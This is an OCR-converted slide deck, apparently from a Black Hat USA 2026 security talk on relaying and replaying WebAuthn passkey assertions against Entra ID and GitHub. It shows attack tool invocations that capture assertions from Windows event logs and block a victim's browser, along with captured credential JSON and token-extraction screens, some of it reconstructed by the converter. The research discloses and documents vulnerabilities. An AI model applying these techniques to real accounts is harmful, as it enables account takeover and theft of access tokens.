---
title: "Pass-the-Passkey Family of Attacks"
speakers: ["Michael Grafnetter"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Michael Grafnetter_Pass-the-Passkey Family of Attacks.pdf"
pages: 71
sha256: "f8f189f759ceb61f28d063dd1f6222b966ae7c779ebccc36fc4bc1a06a5ed9ae"
text_chars: 26689
ocr_pages: 55
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.5
ocr_unreliable_blocks: 1
vision_verified_pages_changed: 70
vision_verified_pages: 71
ocr_timeouts: 0
pages_recovered_from_text_layer: 2
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:39:58Z"
---
# Pass-the-Passkey Family of Attacks

**Speakers:** Michael Grafnetter  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Michael Grafnetter_Pass-the-Passkey Family of Attacks.pdf` (71 pages)


## Slide 1

**Pass-the-Passkey Family of Attacks Michael Grafnetter Principal Security Researcher**

**dsinternals.com @MGrafnetter**

## Slide 2

## **About Me**

## Slide 3

## **Session Agenda**

**03**
Vulnerabilities in Windows 11 and Entra ID

**05**
Open-source tools for Windows

**20+**
Attack techniques

## Slide 4

## **Pass-the-Passkey**

Motivation and Previous Research

## Slide 5

## **Passkeys Are Becoming Mainstream**

www.microsoft.com/en-us/security/blog/2026/07/13/microsoft-entra-id-security-updates-passkeys-are-the-default-authentication-method-in-entra-id/

Microsoft | Security

Products Solutions Pricing Services Partners Why Microsoft Security Resources Contact Sales More All Microsoft Search Light

Blog home > Microsoft Entra ID security updates: Passkeys are the default authentication method in Entra ID

News • July 13 • 5 min read

**Microsoft Entra ID security updates: Passkeys are the default authentication method in Entra ID**

By Nadim Abdo, Corporate Vice President, Identity and Network Access Engineering, Microsoft

Listen to this post

0:00 / 0:00 1X

Powered by Microsoft Copilot

Search the blog

## Slide 6

## **Passkey Attack Surface**

- **Public Key Storage**
- **Relying Party**
- HTTPS
- **WebAuthn API** · **Web Browser** · **Extensions**
- **Password Manager** · **Operating System**
- **Syncable Passkeys** · **Platform Authenticator** · **CTAP2**
- **BUS** · **USB** · **NFC** · **BLE**
- **Secure Element — Private Key Storage**

## Slide 7

## **Side-Channel Attacks Against Hardware Keys**

ars TECHNICA — AI · BIZ & IT · CARS · CULTURE · GAMING · HEALTH · POLICY · SCIENCE · SECURITY · SPACE · TECH · FORUM · SUBSCRIBE

SEND IN THE CLONES

**Hackers can clone Google Titan 2FA keys using a side channel in NXP chips**

Yubico and Feitian keys that use the same chip are likely susceptible, too.

DAN GOODIN – JAN 8, 2021 1:59 PM | 122

## Slide 8

## **Platform Authenticator Vulnerabilities**

CYBERARK — A PALO ALTO NETWORKS COMPANY

Products & Services · Topics · Industry · Content Type

All » Threat Research Blog » Bypassing Windows Hello Without Masks or Plastic Surgery

**Bypassing Windows Hello Without Masks or Plastic Surgery**

Omer Tsarfati | 7/17/23

Share This! Facebook, Twitter, email, LinkedIn

## Slide 9

## **Synced Passkey Exfiltration**

**Your (Synced) Passkey is Weak**
Copying private keys is a bad idea

Brought to you by Allthenticate

Synced "passkeys" were created by Apple as means of vendor lock-in, not as a security feature.

Sign in with Passkey
Requires a device with iOS 17 or later.

Passkeys are only as secure as the mechanism that protects them.

Password manager credentials are phishable.

Disable passkeys in your password manager.

Use device-bound keys for real security.

Not all passkeys are created equal.

**synced passkeys** are stored in cloud-based password managers, which are phishable.

**device-bound** passkeys never leave the hardware and are effectively unphishable.

## Slide 10

## **MITB: Malicious Browser Extension**

zscaler — Solutions · Partners · Research · Resources · About Us · Try SquareX Enterprise

**Passkeys Pwned: Turning WebAuthn Against Itself**

The Passkeys Pwned attack highlights a passkey implementation flaw, specifically that of WebAuthn in the registration and authentication process, allowing unauthorized access to enterprise SaaS apps and resources.

## Slide 11

## **MITM – Missing Request Tampering Validation**

**PIN Bypass in Passwordless WebAuthn on microsoft.com and Nextcloud**

Dr. Dominik Schürmann, Vincent Breitmoser

Aug 12, 2020 · 7 min read · FIDO2, WebAuthn

Attacker sneaks up on the victim and successfully logs in without entering a PIN using Near Field Communication (NFC).

## Slide 12

## **Pass-the-Passkey**

WebAuthn Relay Attack Primitive

## Slide 13

## Authentication Flow – Challenge / Response

**Relying Party Server**

**RP JavaScript Application** / **Browser**

**Authenticator**

- **PublicKeyCredentialRequestOptions** — (1) challenge: Relying Party Server → RP JavaScript Application / Browser
- (0) Browser → Relying Party Server (unlabeled)
- (2) relying party id, clientDataHash: Browser → Authenticator
- (3) user verification, create assertion — at Authenticator
- (4) authenticatorData signature: Authenticator → Browser
- **AuthenticatorAssertionResponse** — (5) clientDataJSON, authenticatorData, signature: Browser → Relying Party Server
- (6) server validation — at Relying Party Server

**WebAuthnAPI** — navigator.credentials.get() (boundary between RP JavaScript Application and Browser)

Source: W3C

## Slide 14

## Relying Party + User Verification Binding

**Generated by authenticator** (left) / **Received from client** (right)

**authenticatorData** structure:

- Flags byte, bit 7 → bit 0: ED, AT, 0, BS, BE, UV, 0, UP
- Fields: **RP ID HASH** (32 bytes) | **FLAGS** (1 byte) | **COUNTER** (4 bytes (big-endian uint32)) | **EXTENSIONS** (variable length if present (CBOR))

**clientDataHash** — received from client

authenticatorData and clientDataHash feed into a concatenation operator (∥), which — together with the **Private key** — feeds into **Sign**.

Sign → **ASSERTION SIGNATURE**

Source: W3C

## Slide 15

## **W3C WebAuthn Specification – Security First**

ONE DOES NOT SIMPLY
PASS THE PASSKEY

imgflip.com

## Slide 16

## **Passkey Injector UI: Custom WebAuthn Prompts**

Left panel — Windows Security:

Sign in with a passkey

satya@microsoft.com
Passkey for login.microsoft.com

Scan your finger on the fingerprint reader.

Choose a different passkey

Cancel

Right panel — Passkey Authentication (WebAuthn Assertion):

Request (Parsed)

Relying Party ID: login.microsoft.com
Challenge: Ty5leUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpTVXpJMU5pSXNJbmcxZENJNklsaDBMVzgzYUVS
Mediation: (blank)   User Verification: Required   Hints: (blank)   Timeout: 600,000
Extensions: (blank)

Allow Credentials:

| Id | Transports | Type |
|---|---|---|
| a6pp8NT17NCV65JbgUbKws8C2ojSjOtiwpuuRXZjEwYy-Mh_hlILWDqwlbkccF | | public-key |
| iQFx-74sQ8bayHtH887-VMZIfrYmosgJXDhUgJrjip8OAQfmZv8bNtmSvMLqbl | | public-key |
| KOrHDdZK-YiovVn77EZQdWVIrX7nnpQFulcNTU4brwc | | public-key |

Request (JSON)

Timers
Request Expiration: 09:23   Challenge JWT Expiration: 04:20

Response (JSON)
Paste response · Software signer · Show C2 commands

```json
{
  "id": "9KjxcpqEtULDuCJmhs1UN2oTd34dEkwpNqPOnAq11-s",
  "rawId": "9KjxcpqEtULDuCJmhs1UN2oTd34dEkwpNqPOnAq11-s",
  "response": {
    "authenticatorData": "NWye1KCTIb1pXx6vkYID8bVfaJ2mH7yWGEwVfdpoDIEFAAAAAA",
    "signature": "MEUCIQDmF-YpPaFyxluitHxaE5yGeX2a_DeMT-F2tdd5zWd7qgIgUqElSirlQll3-w0OodP0JJ…",
    "clientDataJSON": "eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiVHk1bGVVb3daVmhCYVU5c…"
  },
  "type": "public-key"
}
```

Submit

(The signature and clientDataJSON values continue beyond the edge of the panel, which cuts them off.)

## Slide 17

## **Passkey UI: WIN32 WebAuthn API**

"Passkey UI (Not Responding)" window.

Load Default Options   Help

Tabs: Windows API Information | Registration | **Authentication** | Platform Credentials | Authenticators | Event Log

**Assertion Options**

Relying party: login.microsoft.com     U2F AppID:

Authenticator: Any ▾   Credential hint: None ▾   Remote web origin:

User verification: Required ▾   Large blob operation: None ▾   ☐ Get credential blob   ☐ Browser in private mode   Timeout: 120s   Generate challenge

Challenge:
Ty5leUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpTVXpJMU5pSXNJbmcxZENJNklqVlBaamxRTlVZNVowTkRkME50UmpKQ1QwaEllRVJFVVMxRWF5SjkuZXlKaGRXUWlPaUoxY200NmJXbGpjbTl6YjJaME9tWnBaRzg2VwIJoaGJHeGxibWRsSWl3aWFYTnpJam9pYUhSMGNITTZMeTlzYjJkcGJpNXRhV055YjNOdlpuUXVZMjl0SWl3aWFXRjBJam94TmpBNU1qYzNOVFE0TENKdVltWWlPakUyTURreU56YzFORGdzSW1WNGNDSTZNVFl3T1RJTTA1NlpzQlBTREF1YkROeWVGOUpUbk5MVDBoc1pUUjVhemR2U21rM01HMHlNVU5zVjJsV1drSUpNR3hSZFZoSmJXWjBOMVJNWDBwcFRScGMwVXphMDV2UmpSNlgwY3lZbEZoZERkYU9HNTVkVlJaYW1Oa1Rtc3hTbTVPVDBrMVpYQk1NVUl3TmtSNE4yMU9VMDVzWjNabFdXaEtSMDVmYVZCNFJDMWxPVkprVlhKdk5qbFBMV3gxY0hSUFVqVlFYM0I2ZFVwV1UwZEdURXdMWEJaVUhFNU56bEVWbUkyWkY5cE1IWXhiakJLYWtkM2JreGxNVkU1YjNaU1NFSnpSMUUxWXpGdk1VaE5TRE5CZEVsdFpqbDBaazlNY0hCT1QyczNXWE01T1hJSWRGTTVWa0Z3Y1RObWJHNXZUM1Z4V1ZwWFF6QkRNbkpqTlhwc2R6QXdSM3A1T0dWNk5XWnJhMDEwU0RSTFJHcG1iV1oxYVd4ZmIxUkNjMjB5UVVJd1gxWTVOakp4Ums1S3VNR3hzV1hjdGVsQlREbFNVMUxlbE0xVFUwMWFEaHBiMWxGYWt4clpsUkdibHBKYW5kVVZFUnBPSFYzU0cxTUxVOWxVZUZwbg

Large blob: (empty)

HMAC secret salt 1: 8A8F1518100B3EB2F6DD0BF5D72E5BA7DFEB71591ED13CD60D903F9A6B99E   [Generate]     HMAC secret salt 2: (blank)   [Generate]

🔒 Authenticate      📁 Sign with File

**Response**

```json
{
  "id": "5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM",
  "rawId": "5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM",
  "response": {
    "authenticatorData": "NWye1KCTIblpXx6vkYID8bVfaJ2mH7yWGEwVfdpoDIEFAAAAYA",
    "signature": "MEQCIBKQW7RsePaF6EymNFpZkXzEFwvjYFX7c-Ik8_p06s58AiBrCyYWBglNsMVUXjTqTA_04fdC3_ELYQVvK1YT7tiQGw",
    "userHandle": "0XqaPaVaRbsMVE6St7IOaVDB8oVhpNBZ2_w-FNSiemw",
    "clientDataJSON": "eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiVHk1bGVVb3daVmhCYVU5cFNrdFdNVkZwVEVOS2FHSkhZMmxQYVVwVFZYcEpNVTVwU1hOSmJtY3haRU5KTmtscVZsQmFhbXhSVGxWWk5Wb3dUa1JrTUU1MFVtcEtRMVF3YUVsbFJWSkZWVk14UldGNVNqa3VaWGxLYUdSWFVXbFBhVW94WTIwME5tSlhiR3BqYlRsNllqSmFNRTl0V25CYVJ6ZzJWd0lKb2FHSkhlR3hpYldSc1NXbDNhV0ZZVG5wSmFtOXBZVWhTTUdOSVRUWk1lVGx6WWpKa2NHSnBOWFJoVjA1NVlqTk9kbHB1VVhWWk1qbDBTV2wzYVdGWFJqQkphbTk0VG1wQk5VMXFZek5PVkZFMFRFTktkVmx0V1dsUGFrVXlUVVJyZVU1Nll6Rk9SR2R6U1cxV05HTkRTVFpOVkZsM1QxUkpNMDU2WnpCUFNEQXViRE55ZUY5SlRuTkxUMGhzWlRSNWF6ZHZTbWszTUcweU1VTnNWMmxXV2tsSk1HeFJkVmhKYldaME4xUk1YMHBwY1RScGMwVXphMDV2UmpSNlgwY3lZbEZoZERkYU9HNTVkVlJaYW1Oa1Rtc3hTbTVPVDBrMVpYQk1NVUl3TmtSNE4yMU9VMDVzWjNabFdXaEtSMDVmYVZCNFJDMWxPVkprVlhKdk5qbFBMV3gxY0hSUFVqVlFYM0I2ZFVwV1UwZEdURkV3TFhCWlVIRTVOemxFVm1JMlpGOXBNSFl4YmpCS2FrZDNia3hsTVZFNWIzWlJTRUp6UjFFMVl6RnZNVWhOU0ROQmRFbHRaamwwWms5TWNIQk9UMnMzV1hNNU9YSUlkRk01VmtGd2NUTm1iRzV2VDNWeFdWcFhRekJETW5Kak5YcHNkekF3UjNwNU9HVjZOV1pyYTAxMFNETktSR3BtYldaMWFXeGZiMVJDYzIweVFVSXdYMVk1TmpaeFJsSnVNR3hzV1hjdGVYbEJURGxsU1UxTGVsTTFUVTAxYURocGIxbEZha3hyWmxSR2JscEphbmRVVkVScE9IVjNTRzFNTFU5bFVlRnBuIiwib3JpZ2luIjoiaHR0cHM6Ly9sb2dpbi5taWNyb3NvZnQuY29tIiwiY3Jvc3NPcmlnaW4iOmZhbHNlfQ"
  },
  "type": "public-key",
  "clientExtensionResults": {
    "hmacGetSecret": {
      "output1": "vC2iFLb0Gc8XIGnoCtw9b8XHVSBpbyYZVIVQwyWY4C0="
    }
  }
}
```

(The clientDataJSON value shown here is reconstructed from the visible Challenge field plus the confirmed origin/crossOrigin suffix, since the panel itself cuts the raw string off partway and partly hides it behind the overlapping dialog below.)

Overlapping dialog — **Windows Security**: "Sign in with a passkey" — satya@microsoft.com, Passkey for login.microsoft.com — "Scan your finger on the fingerprint reader." — Sign-in options — Choose a different passkey — Cancel

## Slide 18

# **DEMO**

### **Passkey Relay Attack PoC**

## Slide 19

## **CVE-2026-34348**

Microsoft Entra ID Vulnerability Chain

## Slide 20

## **CVE-2026-34348**

Event Viewer window, WebAuthN Operational log.

Navigation tree (partial): WDAG-PolicyEvaluator-GP, WebAuth, WebAuthN (expanded) > Operational (selected), Plugin-Passkey-Providers/O..., Synced-Passkey-Provider/O..., WebDeploy, WEPHOSTSVC, WER-Diagnostics, WER-PayloadHealth, WerKernel, WFP, WiFiNetworkManager, Win32k, Windows Defender, Windows Firewall With Advance[d Security], Windows Remote Management, WindowsBackup, WindowsColorSystem, WindowsSystemAssessmentTo[ol], WindowsUpdateClient, WinHttp (Microsoft-Windows-...), WinINet (Microsoft-Windows-...), Winlogon, WinNat, Winsock Catalog Change, Winsock NameResolution Even[t], Winsock Network Event

**Operational**   Number of events: 6,818

| Level | Date and Time | Source | Event ID | Task Category |
|---|---|---|---|---|
| Success | 1/21/2026 12:19:01 AM | WebAuthN | 1004 | WebAuthN Ctap GetAssertion |
| Information | 1/21/2026 12:19:01 AM | WebAuthN | 2106 | Ctap Function |
| Information | 1/21/2026 12:19:01 AM | WebAuthN | 1104 | Cbor Decode GetAssertion Response |
| Information | 1/21/2026 12:19:01 AM | WebAuthN | 2104 | Ctap Device Info |
| Success | 1/21/2026 12:19:01 AM | WebAuthN | 2102 | Ctap Command |

(Row for Event ID 2106 is selected/highlighted.)

**Event 2106, WebAuthN**

Tabs: General | Details

Ctap Name: authenticationResponseJSON

```json
Value: {"authenticatorAttachment":"platform","clientExtensionResults":{},"id":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM","rawId":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM","response":{"authenticatorData":"NWye1KCTIblpXx6vkYID8bVfaJ2mH7yWGEwVfdpoDIEFAAAAAq","clientDataJSON":"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiVHk1bGVVb3daVmhCYVU5cFNrdFdNVkZwVEVOS2FHSkhZMmxQYVVwVFZYcEpNVTVwU1hOSmJtY3haRU5KTmtscVZsQmFhbXhSVGxWWk5Wb3dUa1JrTUU1MFVtcEtRMVF3YUVsbFJWSkZWVk14UldGNVNqa3VaWGxLYUdSWFVXbFBhVW94WTIwME5tSlhiR3BqYlRsNllqSmFNRTl0V25CYVJ6ZzJWd0lKb2FHSkhlR3hpYldSc1NXbDNhV0ZZVG5wSmFtOXBZVWhTTUdOSVRUWk1lVGx6WWpKa2NHSnBOWFJoVjA1NVlqTk9kbHB1VVhWWk1qbDBTV2wzYVdGWFJqQkphbTk0VG1wQk5VMXFZek5PVkZFMFRFTktkVmx0V1dsUGFrVXlUVVJyZVU1Nll6Rk9SR2R6U1cxV05HTkRTVFpOVkZsM1QxUkpNMDU2WnpCUFNEQXViRE55ZUY5SlRuTkxUMGhzWlRSNWF6ZHZTbWszTUcweU1VTnNWMmxXV2tsSk1HeFJkVmhKYldaME4xUk1YMHBwY1RScGMwVXphMDV2UmpSNlgwY3lZbEZoZERkYU9HNTVkVlJaYW1Oa1Rtc3hTbTVPVDBrMVpYQk1NVUl3TmtSNE4yMU9VMDVzWjNabFdXaEtSMDVmYVZCNFJDMWxPVkprVlhKdk5qbFBMV3gxY0hSUFVqVlFYM0I2ZFVwV1UwZEdURkV3TFhCWlVIRTVOemxFVm1JMlpGOXBNSFl4YmpCS2FrZDNia3hsTVZFNWIzWlJTRUp6UjFFMVl6RnZNVWhOU0ROQmRFbHRaamwwWms5TWNIQk9UMnMzV1hNNU9YSUlkRk01VmtGd2NUTm1iRzV2VDNWeFdWcFhRekJETW5Kak5YcHNkekF3UjNwNU9HVjZOV1pyYTAxMFNETktSR3BtYldaMWFXeGZiMVJDYzIweVFVSXdYMVk1TmpaeFJsSnVNR3hzV1hjdGVYbEJURGxsU1UxTGVsTTFUVTAxYURocGIxbEZha3hyWmxSR2JscEphbmRVVkVScE9IVjNTRzFNTFU5bFVlRnBuIiwib3JpZ2luIjoiaHR0cHM6Ly9sb2dpbi5taWNyb3NvZnQuY29tIiwiY3Jvc3NPcmlnaW4iOmZhbHNlfQ","signature":"MEUCIA8EKq1vxqcXzZmXR55iX_Joodr_4r8PBvBk0v03iKhaAiEA_2A1_0WHAjZFPMwJH0P1YjqPSz71Vxe9iX4llco29tc","userHandle":"0XqaPaVaRbsMVE6St7IOaVDB8oVhpNBZ2_w-FNSiemw"},"type":"public-key"}
```

(This event log entry echoes the same credential id seen in the WIN32 WebAuthn API demo. The clientDataJSON value shown here is reconstructed from the same Challenge value confirmed on that slide plus the origin/crossOrigin suffix read directly off this screenshot.)

Log Name: Microsoft-Windows-WebAuthN/Operational

Source: WebAuthN   Logged: 1/21/2026 12:19:01 AM

Event ID: 2106   Task Category: Ctap Function

Level: Information   Keywords: Ctap

## Slide 21

# **DEMO**

### **Microsoft Entra ID Passkey Replay Attack**

## Slide 22

## **Privileged Identity Separation + Single Authenticator**

Photo of a USB-C security key, with an arrow pointing to a Windows Security dialog.

**Windows Security**

Choose a passkey

- john_admin@contoso.com
- john@contoso.com (highlighted/selected)
- DiegoS@course.dsinternals.com

Cancel

## Slide 23

## **Remote Assertion Retrieval – Event Log Readers**

PowerShell terminal.

```
PS > .\Get-PasskeyAssertionEvent.ps1 -ComputerName GRAY

Time             : 5/11/2026 11:31:16 AM
UserSid          : S-1-5-21-1084105731-826279734-3585910670-1001
UserName         : GRAY\Michael
ProcessId        : 62212
ProcessName      : PasskeyUI
ThreadId         : 7904
Origin           : https://login.microsoft.com
PublicKeyCredential : {"id":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM","rawId":"5B4QTDkm-0C0nJk7KAsUa7d3r914aq5H-eVChLSSejM","type":"public-key","authenticatorAttachment":"platform","response":{"clientDataJSON":"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiVHk1bGVVb3daVmhCYVU5cFNrdFdNVkZwVEVOS2FHSkhZMmxQYVVwVFZYcEpNVTVwU1hOSmJtY3haRU5KTmtscVZsQmFhbXhSVGxWWk5Wb3dUa1JrTUU1MFVtcEtRMVF3YUVsbFJWSkZWVk14UldGNVNqa3VaWGxLYUdSWFVXbFBhVW94WTIwME5tSlhiR3BqYlRsNllqSmFNRTl0V25CYVJ6ZzJWd0lKb2FHSkhlR3hpYldSc1NXbDNhV0ZZVG5wSmFtOXBZVWhTTUdOSVRUWk1lVGx6WWpKa2NHSnBOWFJoVjA1NVlqTk9kbHB1VVhWWk1qbDBTV2wzYVdGWFJqQkphbTk0VG1wQk5VMXFZek5PVkZFMFRFTktkVmx0V1dsUGFrVXlUVVJyZVU1Nll6Rk9SR2R6U1cxV05HTkRTVFpOVkZsM1QxUkpNMDU2WnpCUFNEQXViRE55ZUY5SlRuTkxUMGhzWlRSNWF6ZHZTbWszTUcweU1VTnNWMmxXV2tsSk1HeFJkVmhKYldaME4xUk1YMHBwY1RScGMwVXphMDV2UmpSNlgwY3lZbEZoZERkYU9HNTVkVlJaYW1Oa1Rtc3hTbTVPVDBrMVpYQk1NVUl3TmtSNE4yMU9VMDVzWjNabFdXaEtSMDVmYVZCNFJDMWxPVkprVlhKdk5qbFBMV3gxY0hSUFVqVlFYM0I2ZFVwV1UwZEdURkV3TFhCWlVIRTVOemxFVm1JMlpGOXBNSFl4YmpCS2FrZDNia3hsTVZFNWIzWlJTRUp6UjFFMVl6RnZNVWhOU0ROQmRFbHRaamwwWms5TWNIQk9UMnMzV1hNNU9YSUlkRk01VmtGd2NUTm1iRzV2VDNWeFdWcFhRekJETW5Kak5YcHNkekF3UjNwNU9HVjZOV1pyYTAxMFNETktSR3BtYldaMWFXeGZiMVJDYzIweVFVSXdYMVk1TmpaeFJsSnVNR3hzV1hjdGVYbEJURGxsU1UxTGVsTTFUVTAxYURocGIxbEZha3hyWmxSR2JscEphbmRVVkVScE9IVjNTRzFNTFU5bFVlRnBuIiwib3JpZ2luIjoiaHR0cHM6Ly9sb2dpbi5taWNyb3NvZnQuY29tIiwiY3Jvc3NPcmlnaW4iOmZhbHNlfQ","authenticatorData":"NWye1KCTIblpXx6vkYID8bVfaJ2mH7yWGEwVfdpoDIEFAAAAaA","signature":"MEUCIGfpfD82B8iH_AkWUvC9pGPkRQNN8VBCFtglGVnaThDwAiEAz7oWW2ZPos1WZkTdFr-WNYhlpd9fAYWb8oU8-At42dk","userHandle":"0XqaPaVaRbsMVE6St7IOaVDB8oVhpNBZ2_w-FNSiemw"},"clientExtensionResults":{}}

PS >
```

(PublicKeyCredential's clientDataJSON is reconstructed from the Challenge value confirmed on the WIN32 WebAuthn API slide plus the origin/crossOrigin suffix read directly off this screenshot; it shares the same credential id, origin and user as that demo. authenticatorData and signature are read directly from this screenshot's clean monospace terminal text.)

## Slide 24

## **Entra ID Challenge Validity = 10 minutes**

https://portal.azure.com

**Sign-in failed**

Error code: invalid_request

Error message: invalid_request: invalid_request: AADSTS135018: Invalid challenge received from fido assertion. Trace ID: 80fc2022-09ce-4b20-84cd-1c34fc623d00 Correlation ID: 019bcdaf-08b4-748d-9c9f-bb6a31768835 Timestamp: 2026-01-17 20:40:39Z

Learn more about the error >

## Slide 25

## **JWT ≠ NONCE**

```json
{
  "typ": "JWT",
  "alg": "RS256",
  "x5t": "PcX98GX420T1X6sBDkzhQmqgwMU"
}
```

```json
{
  "aud": "urn:microsoft:fido:challenge",
  "iss": "https://login.microsoft.com",
  "iat": 1768947547,
  "nbf": 1768947547,
  "exp": 1768947847
}
```

## Slide 26

## **Signature Counter for Device-Bound Passkeys**

"Passkey UI" window.

Load Default Options   Help

Tabs: Windows API Information | Registration | Authentication | Platform Credentials | Authenticators | **Event Log**

Load Events

**Passkey Operations**

| Time Started | Type | Relying Party | Provider | Product | Counter | User Name |
|---|---|---|---|---|---|---|
| 2026-05-09 23:49:38 | Authentication | login.microsoft.com | MicrosoftPlatformProvider | | 103 | |
| 2026-05-09 19:13:33 | Authentication | github.com | MicrosoftPlatformProvider | | 117 | |
| 2026-05-08 02:28:00 | Authentication | login.microsoft.com | MicrosoftPlatformProvider | | 102 | |
| 2026-05-06 10:01:17 | Authentication | login.microsoft.com | MicrosoftPlatformProvider | | 101 | |
| 2026-05-05 22:03:18 | Authentication | login.microsoft.com | MicrosoftCtapHidProvider | YubiKey FIDO | 238 | |
| 2026-05-05 22:02:56 | Authentication | login.microsoft.com | MicrosoftCtapHidProvider | YubiKey FIDO | 222 | |

## Slide 27

## **Partial Fix in May 2026**

**Sign-in failed**

Error code: invalid_request

Error message: invalid_request: AADSTS135017: Unexpected Signature Counter received from authenticator. Trace ID: d751c9b8-b732-4b9b-9a49-b8cec2b11200 Correlation ID: 019e2796-7854-7c37-8a85-2b45f85598da Timestamp: 2026-05-14 17:43:58Z

Learn more about the error >

## Slide 28

## **From Passkeys to OIDC Access Tokens**

"SpecterOps Passkey Injector" window. Address bar: https://

- Bookmarks >
- Request Tokens > (expanded submenu, "Microsoft Azure PowerShell" highlighted)
  - Microsoft Teams
  - Microsoft Edge
  - Microsoft Graph Command Line Tools
  - Microsoft Azure PowerShell
  - Microsoft Azure CLI
  - Microsoft Intune Company Portal
  - Office 365 Management
  - Microsoft Office
  - OneDrive
- Developer Tools
- Clear Browsing Data

## Slide 29

## **From Passkeys to OIDC Access Tokens**

"Token Response for Microsoft Office" window.

Tokens (JSON):

```json
{
  "token_type": "Bearer",
  "scope": "email openid profile AuditLog.Create Calendar.ReadWrite Calendars.Read.Shared Calendars.ReadWrite…
  "expires_in": 4595,
  "ext_expires_in": 4595,
  "access_token": "eyJ0eXAiOiJKV1QiLCJub25jZSI6Il9vWEoyOXlsaC1jQm9MSC1WOUc2WkhMeXRpLWtFOE1JZVV5bmRQNEpsTDgiL…
  "refresh_token": "1.ARwA6WgJJ9X2qkOUDNMw4dUNg9YOWdOzUgJBrv-q0ikqsBzOAMkcAA.BQABAwEAAAADAOz_BQD0_-SggWeqGeIH…
  "foci": "1",
  "id_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlBjWDk4R1g0MjBUMVg2c0JEa3poUW1xZ3dNVSJ9.eyJhdWQiO…
}
```

(All four dense values continue beyond the panel's right edge, which cuts them off; "kid" in the id_token header decodes to the same x5t value "PcX98GX420T1X6sBDkzhQmqgwMU" shown on the JWT ≠ NONCE slide.)

Copy Access Token   Copy Refresh Token   Copy ID Token

## Slide 30

# **DEMO**

### **OpenID Connect Token Acquisition**

## Slide 31

## **Passkey Circuit Breaker Attack – End User**

Browser tab: "Sign in to GitHub · GitHub". Address bar: github.com/login. Status bar, circled: "Waiting for github.com..."

**Sign in to GitHub**

Username or email address

Password                    Forgot password?

Sign in

or

Verifying... (greyed out/disabled)
G Continue with Google
 Continue with Apple

## Slide 32

## **Passkey Circuit Breaker Attack – Operator**

```
PS > .\Invoke-PasskeyCircuitBreaker.ps1 -Suspend -BlockTraffic
Listening for WebAuthN assertion response events... Press Ctrl+C to stop.
Write-Error: C:\Users\Michael\source\repos\SpecterOps\pass-the-passkey\Src\Scripts\Invoke-PasskeyCircuitBreaker.ps1:74
Line |
  74 |  …          Block-ProcessOutboundTraffic -ProcessPath $process.Path
     |             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     | Error blocking outbound traffic for C:\Program Files\Mozilla Firefox\firefox.exe.
Captured WebAuthn assertion request:

EventId     : 1103
Time        : 5/11/2026 11:36:19 AM
UserSid     : S-1-5-21-1084105731-826279734-3585910670-1001
UserName    : GRAY\Michael
ProcessId   : 1396
ProcessName : firefox
ThreadId    : 20008
RpId        : github.com

Captured CTAP device info event:

EventId      : 2104
Time         : 5/11/2026 11:36:26 AM
UserSid      : S-1-5-21-1084105731-826279734-3585910670-1001
UserName     : GRAY\Michael
ProcessId    : 1396
ProcessName  : firefox
ThreadId     : 20008
ProviderName : MicrosoftPlatformProvider
Manufacturer :
Product      :
AAGuid       : 00000000-0000-0000-0000-000000000000

Captured WebAuthn assertion response:

EventId             : 2106
Time                : 5/11/2026 11:36:26 AM
UserSid             : S-1-5-21-1084105731-826279734-3585910670-1001
UserName            : GRAY\Michael
ProcessId           : 1396
ProcessName         : firefox
ThreadId            : 20008
Origin              : https://github.com
PublicKeyCredential : {"id":"kGExWOTJk3CV-igJrwoDrupadlREaz5hgV7LlucUDho","rawId":"kGExWOTJk3CV-igJrwoDrupadlREaz5hgV7LlucUDho","type":
                      "public-key","authenticatorAttachment":"platform","response":{"clientDataJSON":"eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY
```

(The terminal window is cut off at this last visible line; PublicKeyCredential's clientDataJSON continues beyond what is shown on the page. This block mixes clean, high-confidence monospace text — the script path, event fields, GUIDs — with a credential id/rawId and a clientDataJSON prefix that should be read as reasonably but not perfectly reliable, per this corpus's dense-value caveat.)

## Slide 33

## **GitHub the Grey – Session-Bound Challenges**

Meme image (Gandalf, "You Shall Not Pass", with the GitHub Octocat's head composited onto Gandalf's face):

YOU SHALL NOT PASS

THE PASSKEY

## Slide 34

## **Pass-the-Passkey**

Synced Passkey Attacks

## Slide 35

## **Synced Passkeys**

Diagram, two panels side by side.

**Synced Passkey** — icon of a cloud plus four devices (phone, tablet, laptop, desktop), each showing a person+key icon, with double-headed arrows connecting every device to every other device and to the cloud.

Lives on a smartphone, tablet, laptop or other device where it can be copied and synced across many devices.

**Device-bound Passkey** — a phone in the center showing a person+key+lock icon, with double-headed arrows to a tablet, another phone, a laptop and a desktop (each marked with a green checkmark), and a USB key icon below the phone.

Lives on a USB key or other piece of hardware separate from everyday devices.

Source: Yubico

## Slide 36

## **Server-Side Synced Passkey Protection**

**Edge Passkey Service**

- Managed HSM (Hardware protected keys)
- Confidential Ledger (Tamper-Evident Storage)
- Confidential Compute (Secure Processing & Recovery)
- Edge Sync Service (Sync Encrypted Passkeys)

↕ connected to:

**Client Devices** (Biometrics/PIN & Device bound Keys)

Source: Microsoft

## Slide 37

## **KeePassXC Passkey Export**

"Passwords - KeePassXC" window.

Database   Entries   Groups   Tools   View   Help

Left sidebar: Statistics, Health Check, **Passkeys** (selected), Browser Statistics

